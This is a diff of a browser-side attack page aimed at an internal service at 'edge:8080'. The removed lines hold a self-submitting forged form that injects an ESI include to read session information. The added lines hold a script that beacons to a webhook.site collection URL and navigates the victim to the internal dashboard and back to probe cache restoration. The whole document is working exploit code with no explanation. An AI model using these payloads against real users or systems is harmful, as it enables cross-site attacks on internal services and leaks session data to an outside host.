@@ -1,5 +1,12 @@
 <!doctype html><meta charset="utf-8">
-<body onload="document.forms[0].submit()">
-<form method="POST" action="http://edge:8080/preview">
-<input name="template" value='<esi:include src="/fragments/session-info"/>'>
-</form>
+<body>
+<script>
+const W="https://webhook.site/4870c85a-b9e2-4532-ac83-8c07bae03b80/";
+new Image().src=W+"?t2=start";
+addEventListener("pageshow", e => {
+  new Image().src = W + "?t2=pageshow&persisted=" + e.persisted;
+});
+// go to edge dashboard, then come back — tests bfcache restore
+setTimeout(() => { location.href = "http://edge:8080/dashboard"; }, 1500);
+setTimeout(() => { history.back(); }, 4000);
+</script>
